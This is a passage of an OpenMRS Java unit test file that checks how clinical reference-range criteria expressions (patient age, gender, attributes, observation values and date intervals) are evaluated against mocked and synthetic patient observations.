/**
 * This Source Code Form is subject to the terms of the Mozilla Public License,
 * v. 2.0. If a copy of the MPL was not distributed with this file, You can
 * obtain one at http://mozilla.org/MPL/2.0/. OpenMRS is also distributed under
 * the terms of the Healthcare Disclaimer located at http://openmrs.org/license.
 *
 * Copyright (C) OpenMRS Inc. OpenMRS is a registered trademark and the OpenMRS
 * graphic logo is a trademark of OpenMRS Inc.
 */
package org.openmrs.util;

import java.util.Calendar;
import java.util.Collections;
import java.util.Date;

import org.joda.time.DateTime;
import org.joda.time.DateTimeUtils;
import org.joda.time.LocalTime;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.Mock;
import org.mockito.Mockito;
import org.openmrs.Concept;
import org.openmrs.ConceptDatatype;
import org.openmrs.Encounter;
import org.openmrs.Location;
import org.openmrs.Obs;
import org.openmrs.Patient;
import org.openmrs.Person;
import org.openmrs.PersonAttribute;
import org.openmrs.PersonAttributeType;
import org.openmrs.api.APIException;
import org.openmrs.api.ConceptService;
import org.openmrs.api.ObsService;
import org.openmrs.api.context.Context;
import org.openmrs.test.jupiter.BaseContextSensitiveTest;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

class ConceptReferenceRangeUtilityTest extends BaseContextSensitiveTest {

	private Calendar calendar;

	private Person person;

	private ConceptReferenceRangeUtility conceptReferenceRangeUtility;

	@Mock
	private ObsService obsService;

	@Mock
	private ConceptService conceptService;

	@BeforeEach
	public void setUp() {
		person = new Person();
		conceptReferenceRangeUtility = new ConceptReferenceRangeUtility();
	}

	@Test
	public void testAgeInRange_shouldReturnTrueIfAgeIsWithinRange() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -5);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria("$patient.getAge() > 1 && $patient.getAge() < 10", obs));
	}

	@Test
	public void testAgeInRange_shouldReturnFalseIfAgeIsOutsideRange() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -11);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertFalse(conceptReferenceRangeUtility.evaluateCriteria("$patient.getAge() > 1 && $patient.getAge() < 10", obs));
	}

	@Test
	public void testAgeInRange_shouldReturnTrueIfAgeIsOnBoundary() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -10);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria("$patient.getAge() >= 1 && $patient.getAge() <= 10", obs));
	}

	@Test
	public void testAgeInMonths_shouldReturnTrueIfAgeIsWithinRange() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.MONTH, -5);
		Date birthDate = calendar.getTime();
		person.setBirthdate(birthDate);

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$patient.getAgeInMonths() > 1 && $patient.getAgeInMonths() < 12", obs));
	}

	@Test
	public void testAgeInDays_shouldReturnTrueIfAgeIsWithinRange() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.DAY_OF_YEAR, -5);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$patient.getAgeInDays() >= 0 && $patient.getAgeInDays() <= 7", obs));
	}

	@Test
	public void testAgeInDays_shouldReturnFalseIfAgeIsOutsideRange() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.DAY_OF_YEAR, -10);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertFalse(conceptReferenceRangeUtility
		        .evaluateCriteria("$patient.getAgeInDays() >= 0 && $patient.getAgeInDays() <= 7", obs));
	}

	@Test
	public void testAgeInWeeks_shouldReturnTrueIfAgeMatches() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.WEEK_OF_YEAR, -2);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria("$patient.getAgeInWeeks() == 2", obs));
	}

	@Test
	public void testMixedAgeMethods_shouldReturnTrueIfBothConditionsMatch() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.MONTH, -8);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(
		    conceptReferenceRangeUtility.evaluateCriteria("$patient.getAgeInMonths() >= 6 && $patient.getAge() < 2", obs));
	}

	@Test
	public void testAgeInRange_shouldThrowExceptionIfCriteriaIsInvalid() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -1);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertThrows(APIException.class, () -> conceptReferenceRangeUtility.evaluateCriteria("invalidCriteria", obs));
	}

	@Test
	public void testAgeInRange_shouldThrowAnExceptionIfCriteriaIsEmpty() {
		calendar = Calendar.getInstance();
		calendar.set(2019, Calendar.JUNE, 2);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		IllegalArgumentException exception = assertThrows(IllegalArgumentException.class, () -> {
			conceptReferenceRangeUtility.evaluateCriteria("", obs);
		});

		assertTrue(exception.getMessage().contains("criteria is empty"));
	}

	@Test
	public void testAgeInRange_shouldReturnFalseIfPersonAgeIsNotSet() {
		Obs obs = buildObs();
		obs.setPerson(person);

		assertFalse(
		    conceptReferenceRangeUtility.evaluateCriteria("$patient.getAge() >= 15 && $patient.getAge() <= 50", obs));
	}

	@Test
	public void testGenderMatch_shouldReturnTrueIfGenderMatches() {
		person.setGender("M");

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria("$patient.getGender().equals('M')", obs));
	}

	@Test
	public void testGenderMatch_shouldReturnFalseIfGenderDoesNotMatch() {
		person.setGender("F");

		Obs obs = buildObs();
		obs.setPerson(person);

		assertFalse(conceptReferenceRangeUtility.evaluateCriteria("$patient.getGender().equals('M')", obs));
	}

	@Test
	public void testGenderMatch_shouldReturnFalseIfGenderIsNull() {
		Obs obs = buildObs();
		obs.setPerson(person);

		assertFalse(conceptReferenceRangeUtility.evaluateCriteria("$patient.getGender().equals('M')", obs));
	}

	@Test
	public void testGenderMatch_shouldReturnTrueForDoubleQuoteEquality() {
		person.setGender("F");

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria("$patient.getGender() == \"F\"", obs));
	}

	@Test
	public void testGenderMatch_shouldReturnFalseForDoubleQuoteEqualityWhenGenderDoesNotMatch() {
		person.setGender("M");

		Obs obs = buildObs();
		obs.setPerson(person);

		assertFalse(conceptReferenceRangeUtility.evaluateCriteria("$patient.getGender() == \"F\"", obs));
	}

	@Test
	public void testAgeAndGenderMatch_shouldReturnTrueIfAgeAndGenderMatch() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -5);
		person.setBirthdate(calendar.getTime());
		person.setGender("M");

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria(
		    "$patient.getAge() > 1 && $patient.getAge() < 10 && $patient.getGender().equals('M')", obs));
	}

	@Test
	public void testAgeAndGenderMatch_shouldReturnTrueIfAgeOrGenderMatch() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -5);
		person.setBirthdate(calendar.getTime());
		person.setGender("M");

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria(
		    "($patient.getAge() > 1 && $patient.getAge() < 3) || $patient.getGender().equals('M')", obs));
	}

	@Test
	public void testAgeAndGenderMatch_shouldReturnFalseIfAgeDoesNotMatch() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -11);
		person.setBirthdate(calendar.getTime());
		person.setGender("M");

		Obs obs = buildObs();
		obs.setPerson(person);

		assertFalse(conceptReferenceRangeUtility.evaluateCriteria(
		    "$patient.getAge() > 1 && $patient.getAge() < 10 && $patient.getGender().equals('M')", obs));
	}

	@Test
	public void testAgeAndGenderMatch_shouldReturnFalseIfGenderDoesNotMatch() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -5);
		person.setBirthdate(calendar.getTime());
		person.setGender("F");

		Obs obs = buildObs();
		obs.setPerson(person);

		assertFalse(conceptReferenceRangeUtility.evaluateCriteria(
		    "$patient.getAge() > 1 && $patient.getAge() < 10 && $patient.getGender().equals('M')", obs));
	}

	@Test
	public void testAgeAndGenderMatch_shouldThrowExceptionIfPersonIsNull() {

		IllegalArgumentException thrown = assertThrows(IllegalArgumentException.class,
		    () -> conceptReferenceRangeUtility.evaluateCriteria(
		        "$patient.getAge() > 1 && $patient.getAge() < 10 && $patient.getGender().equals('M')", (Obs) null));

		assertEquals("Failed to evaluate criteria with reason: Obs is null", thrown.getMessage());
	}

	@Test
	public void testAgeAndGenderMatch_shouldReturnFalseIfAgeIsNull() {
		Obs obs = buildObs();
		obs.setPerson(person);

		assertFalse(conceptReferenceRangeUtility.evaluateCriteria("$patient.getAge() > 1 && $patient.getAge() < 10", obs));
	}

	@Test
	public void testObsValueMatch_shouldReturnTrueIfValueCodedMatch() {
		Obs obs = buildObs();
		obs.setPerson(person);

		Concept valueCoded = new Concept(900);
		obs.setValueCoded(valueCoded);

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference("CIEL:1234")).thenReturn(concept);
		Mockito.when(conceptService.getConceptByReference("CIEL:1000")).thenReturn(valueCoded);

		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.isObsValueCodedAnswer('CIEL:1234', $patient, 'CIEL:1000')", obs));
	}

	@Test
	public void testObsValueMatch_shouldReturnTrueIfValueTextMatch() {
		person.setGender("F");

		Obs obs = buildObs();
		obs.setPerson(person);
		obs.setValueText("PREGNANT");

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference(Mockito.anyString())).thenReturn(concept);

		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria("$patient.getGender().equals('F') "
		        + "&& $fn.getLatestObs('bac25fd5-c143-4e43-bffe-4eb1e7efb6ce', $patient).getValueText().equals('PREGNANT')",
		    obs));
	}

	@Test
	public void testObsValueMatch_shouldReturnTrueIfPersonAttributeMatch() {
		PersonAttributeType personAttributeType = new PersonAttributeType();
		personAttributeType.setName("Race");
		personAttributeType.setSearchable(true);

		PersonAttribute personAttribute = new PersonAttribute();
		personAttribute.setAttributeType(personAttributeType);
		personAttribute.setValue("Maasai");

		person.setAttributes(Collections.singleton(personAttribute));

		Obs obs = buildObs();
		obs.setPerson(person);
		obs.setValueText("PREGNANT");

		assertTrue(
		    conceptReferenceRangeUtility.evaluateCriteria("$patient.getAttribute('Race').getValue() == 'Maasai'", obs));
	}

	@Test
	public void testObsValueMatch_shouldReturnFalseIfValueMismatch() {
		person.setId(1);

		Obs obs = buildObs();
		obs.setPerson(person);

		assertFalse(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getLatestObs('CIEL:1234', $patient).getValueBoolean() == true", obs));
	}

	@Test
	public void testNegation_shouldReturnTrueWhenAllNegatedConditionsAreFalse() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -25);
		person.setBirthdate(calendar.getTime());
		person.setGender("F");

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(
		    conceptReferenceRangeUtility.evaluateCriteria("$patient.getAge() > 18 && $patient.getGender() == \"F\" && "
		            + "!($fn.isObsValueCodedAnswer(\"CIEL:45\", $patient, \"CIEL:703\") "
		            + "|| $fn.isObsValueCodedAnswer(\"CIEL:1945\", $patient, \"CIEL:703\"))",
		        obs));
	}

	@Test
	public void testNegation_shouldReturnFalseWhenNegatedConditionIsTrue() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -25);
		person.setBirthdate(calendar.getTime());
		person.setGender("F");

		Obs obs = buildObs();
		obs.setPerson(person);

		Concept questionConcept = new Concept(4900);
		Concept answerConcept = new Concept(900);
		obs.setValueCoded(answerConcept);

		Mockito.when(conceptService.getConceptByReference("CIEL:45")).thenReturn(questionConcept);
		Mockito.when(conceptService.getConceptByReference("CIEL:703")).thenReturn(answerConcept);

		Mockito.when(
		    obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(questionConcept),
		        null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertFalse(
		    conceptReferenceRangeUtility.evaluateCriteria("$patient.getAge() > 18 && $patient.getGender() == \"F\" && "
		            + "!($fn.isObsValueCodedAnswer(\"CIEL:45\", $patient, \"CIEL:703\") "
		            + "|| $fn.isObsValueCodedAnswer(\"CIEL:1945\", $patient, \"CIEL:703\"))",
		        obs));
	}

	@Test
	public void testTimeOfDay_shouldReturnTrueIfTimeOfDayMatches() {
		// Freeze time at the current system time
		DateTimeUtils.setCurrentMillisFixed(System.currentTimeMillis());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(
		    conceptReferenceRangeUtility.evaluateCriteria("$fn.getCurrentHour() == " + LocalTime.now().getHourOfDay(), obs));

		// Clean up: Reset time to system time
		DateTimeUtils.setCurrentMillisSystem();
	}

	@Test
	public void testTimeOfDay_shouldReturnFalseIfTimeOfDayDoesNotMatch() {
		// Freeze time at the current system time
		DateTimeUtils.setCurrentMillisFixed(System.currentTimeMillis());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertFalse(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getCurrentHour() == " + LocalTime.now().plusHours(1).getHourOfDay(), obs));

		// Clean up: Reset time to system time
		DateTimeUtils.setCurrentMillisSystem();
	}

	@Test
	public void testRelevantObs_shouldReturnTrueIfCurrentObsHasValidNumericValue() {
		Obs obs = buildObs();
		obs.setPerson(person);
		obs.setValueNumeric(20.0);

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference(Mockito.anyString())).thenReturn(concept);

		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria(
		    "$fn.getCurrentObs('bac25fd5-c143-4e43-bffe-4eb1e7efb6ce', $obs).getValueNumeric() >= 20", obs));
	}

	@Test
	public void testRelevantObs_shouldReturnCurrentObsWhenItMatchesConceptAndHasValue() {
		Concept obsConcept = new Concept(5089);
		obsConcept.setDatatype(new ConceptDatatype(3));

		Obs obs = new Obs();
		obs.setConcept(obsConcept);
		obs.setPerson(person);
		obs.setValueNumeric(42.0);
		obs.setObsDatetime(new Date());
		obs.setEncounter(new Encounter(3));
		obs.setLocation(new Location(1));

		Mockito.when(conceptService.getConceptByReference("test-concept-ref")).thenReturn(obsConcept);

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getCurrentObs('test-concept-ref', $obs).getValueNumeric() == 42.0", obs));
	}

	@Test
	public void testRelevantObs_shouldReturnTrueIfBMIIsInTheExpectedRange() {
		Obs obs = buildObs();
		obs.setPerson(person);

		Obs heightObservation = buildObs();
		heightObservation.setValueNumeric(170.0);

		Obs weightObservation = buildObs();
		weightObservation.setValueNumeric(70.0);

		Concept heightConcept = new Concept(5497);
		Concept weightConcept = new Concept(5089);

		Mockito.when(conceptService.getConceptByReference("a09ab2c5-878e-4905-b25d-5784167d0216")).thenReturn(heightConcept);
		Mockito.when(conceptService.getConceptByReference("c607c80f-1ea9-4da3-bb88-6276ce8868dd")).thenReturn(weightConcept);

		Mockito.when(
		    obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(heightConcept),
		        null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(heightObservation));

		Mockito.when(
		    obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(weightConcept),
		        null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(weightObservation));

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria(
		    "($fn.getCurrentObs('c607c80f-1ea9-4da3-bb88-6276ce8868dd', $obs).getValueNumeric() "
		            + "/ ( ($fn.getCurrentObs('a09ab2c5-878e-4905-b25d-5784167d0216', $obs).getValueNumeric() / 100) * "
		            + "($fn.getCurrentObs('a09ab2c5-878e-4905-b25d-5784167d0216', $obs).getValueNumeric() / 100))) >= 18.5 && "
		            + "($fn.getCurrentObs('c607c80f-1ea9-4da3-bb88-6276ce8868dd', $obs).getValueNumeric() / "
		            + "( ($fn.getCurrentObs('a09ab2c5-878e-4905-b25d-5784167d0216', $obs).getValueNumeric() / 100) * "
		            + "($fn.getCurrentObs('a09ab2c5-878e-4905-b25d-5784167d0216', $obs).getValueNumeric() / 100))) < 25",
		    obs));
	}

	@Test
	public void getObsDays_shouldReturnNumberOfDaysFromObsDate() {
		Obs obs = buildObs();
		obs.setPerson(person);

		calendar = Calendar.getInstance();
		calendar.add(Calendar.DAY_OF_YEAR, -90);
		obs.setValueDate(calendar.getTime());

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference(Mockito.anyString())).thenReturn(concept);

		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getObsDays('bac25fd5-c143-4e43-bffe-4eb1e7efb6ce', $patient) == 90", obs));
	}

	@Test
	public void getObsWeeks_shouldReturnNumberOfWeeksFromObsDate() {
		Obs obs = buildObs();
		obs.setPerson(person);

		calendar = Calendar.getInstance();
		calendar.add(Calendar.WEEK_OF_YEAR, -32);
		obs.setValueDate(calendar.getTime());

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference(Mockito.anyString())).thenReturn(concept);

		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getObsWeeks('bac25fd5-c143-4e43-bffe-4eb1e7efb6ce', $patient) == 32", obs));
	}

	@Test
	public void getObsMonths_shouldReturnNumberOfMonthsFromObsDate() {
		Obs obs = buildObs();
		obs.setPerson(person);

		calendar = Calendar.getInstance();
		calendar.add(Calendar.MONTH, -9);
		obs.setValueDate(calendar.getTime());

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference(Mockito.anyString())).thenReturn(concept);

		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getObsMonths('bac25fd5-c143-4e43-bffe-4eb1e7efb6ce', $patient) == 9", obs));
	}

	@Test
	public void getObsYears_shouldReturnNumberOfYearsFromObsDate() {
		Obs obs = buildObs();
		obs.setPerson(person);

		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -18);
		obs.setValueDate(calendar.getTime());

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference(Mockito.anyString())).thenReturn(concept);

		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getObsYears('bac25fd5-c143-4e43-bffe-4eb1e7efb6ce', $patient) == 18", obs));
	}

	@Test
	public void getObsWeeks_shouldReturnNegativeOneForNullValueDate() {
		Obs obs = buildObs();
		obs.setPerson(person);
		obs.setValueDate(null);

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference(Mockito.anyString())).thenReturn(concept);

		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getObsWeeks('bac25fd5-c143-4e43-bffe-4eb1e7efb6ce', $patient) == -1", obs));
	}

	@Test
	public void getObsDays_shouldReturnNegativeOneForNullValueDate() {
		Obs obs = buildObs();
		obs.setPerson(person);
		obs.setValueDate(null);

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference(Mockito.anyString())).thenReturn(concept);

		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getObsDays('bac25fd5-c143-4e43-bffe-4eb1e7efb6ce', $patient) == -1", obs));
	}

	@Test
	public void getObsMonths_shouldReturnNegativeOneForNullValueDate() {
		Obs obs = buildObs();
		obs.setPerson(person);
		obs.setValueDate(null);

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference(Mockito.anyString())).thenReturn(concept);

		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getObsMonths('bac25fd5-c143-4e43-bffe-4eb1e7efb6ce', $patient) == -1", obs));
	}

	@Test
	public void getObsYears_shouldReturnNegativeOneForNullValueDate() {
		Obs obs = buildObs();
		obs.setPerson(person);
		obs.setValueDate(null);

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference(Mockito.anyString())).thenReturn(concept);

		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getObsYears('bac25fd5-c143-4e43-bffe-4eb1e7efb6ce', $patient) == -1", obs));
	}

	@Test
	public void getDaysBetween_shouldReturnNegativeOneForNullDate() {
		person.setBirthdate(null);

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getDaysBetween($patient.birthdate, $obs.obsDatetime) == -1", obs));
	}

	@Test
	public void getWeeksBetween_shouldReturnNegativeOneForNullDate() {
		person.setBirthdate(null);

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getWeeksBetween($patient.birthdate, $obs.obsDatetime) == -1", obs));
	}

	@Test
	public void getMonthsBetween_shouldReturnNegativeOneForNullDate() {
		person.setBirthdate(null);

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getMonthsBetween($patient.birthdate, $obs.obsDatetime) == -1", obs));
	}

	@Test
	public void getYearsBetween_shouldReturnNegativeOneForNullDate() {
		person.setBirthdate(null);

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getYearsBetween($patient.birthdate, $obs.obsDatetime) == -1", obs));
	}

	@Test
	public void testDaysBetween_shouldSupportPropertyAccessAsMethodArguments() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.DAY_OF_YEAR, -15);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);
		obs.setObsDatetime(new Date());

		assertTrue(
		    conceptReferenceRangeUtility.evaluateCriteria("$fn.getDaysBetween($patient.birthdate, $obs.obsDatetime) >= 0 "
		            + "&& $fn.getDaysBetween($patient.birthdate, $obs.obsDatetime) < 30",
		        obs));
	}

	@Test
	public void getWeeksBetween_shouldReturnNumberOfWeeksBetweenDates() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.WEEK_OF_YEAR, -10);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);
		obs.setObsDatetime(new Date());

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getWeeksBetween($patient.birthdate, $obs.obsDatetime) == 10", obs));
	}

	@Test
	public void getMonthsBetween_shouldReturnNumberOfMonthsBetweenDates() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.MONTH, -6);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);
		obs.setObsDatetime(new Date());

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getMonthsBetween($patient.birthdate, $obs.obsDatetime) == 6", obs));
	}

	@Test
	public void getYearsBetween_shouldReturnNumberOfYearsBetweenDates() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -3);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);
		obs.setObsDatetime(new Date());

		assertTrue(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getYearsBetween($patient.birthdate, $obs.obsDatetime) == 3", obs));
	}

	@Test
	public void getDays_shouldReturnNumberOfDaysFromDateToNow() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.DAY_OF_YEAR, -45);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria("$fn.getDays($patient.birthdate) == 45", obs));
	}

	@Test
	public void getWeeks_shouldReturnNumberOfWeeksFromDateToNow() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.WEEK_OF_YEAR, -8);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria("$fn.getWeeks($patient.birthdate) == 8", obs));
	}

	@Test
	public void getMonths_shouldReturnNumberOfMonthsFromDateToNow() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.MONTH, -4);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria("$fn.getMonths($patient.birthdate) == 4", obs));
	}

	@Test
	public void getYears_shouldReturnNumberOfYearsFromDateToNow() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -7);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria("$fn.getYears($patient.birthdate) == 7", obs));
	}

	@Test
	public void getLatestObsDate_shouldReturnObservationDate() {
		Obs obs = buildObs();
		obs.setPerson(person);

		calendar = Calendar.getInstance();
		calendar.add(Calendar.DAY_OF_YEAR, -30);
		obs.setValueDate(calendar.getTime());

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference(Mockito.anyString())).thenReturn(concept);

		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obs));

		assertTrue(conceptReferenceRangeUtility.evaluateCriteria(
		    "$fn.getDays($fn.getLatestObsDate('bac25fd5-c143-4e43-bffe-4eb1e7efb6ce', $patient)) == 30", obs));
	}

	@Test
	public void getLatestObsDate_shouldReturnNullForMissingObs() {
		Obs obs = buildObs();
		obs.setPerson(person);

		assertFalse(conceptReferenceRangeUtility
		        .evaluateCriteria("$fn.getLatestObsDate('bac25fd5-c143-4e43-bffe-4eb1e7efb6ce', $patient) != null", obs));
	}

	@Test
	public void testAgeAndObs_shouldReturnTrueIfAgeAndObsConditionsMatch() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.DAY_OF_YEAR, -5);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		Obs obsWithDate = buildObs();
		calendar = Calendar.getInstance();
		calendar.add(Calendar.WEEK_OF_YEAR, -33);
		obsWithDate.setValueDate(calendar.getTime());

		Concept concept = new Concept(4900);

		Mockito.when(conceptService.getConceptByReference("CIEL:1427")).thenReturn(concept);
		Mockito.when(obsService.getObservations(Collections.singletonList(person), null, Collections.singletonList(concept),
		    null, null, null, Collections.singletonList("dateCreated"), 1, null, null, null, false))
		        .thenReturn(Collections.singletonList(obsWithDate));

		assertTrue(
		    conceptReferenceRangeUtility.evaluateCriteria("$patient.getAgeInDays() >= 0 && $patient.getAgeInDays() <= 7 "
		            + "&& $fn.getObsWeeks('CIEL:1427', $patient) >= 32",
		        obs));
	}

	// all the following tests use data from the standard test dataset instead of mocking
	@Test
	public void isEnrolledInProgram_shouldReturnTrueIfPatientIsEnrolledInProgram() {
